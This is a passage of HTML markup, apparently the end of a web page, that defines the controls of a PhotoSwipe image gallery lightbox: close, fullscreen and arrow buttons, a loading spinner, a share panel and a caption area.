                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>





</html>
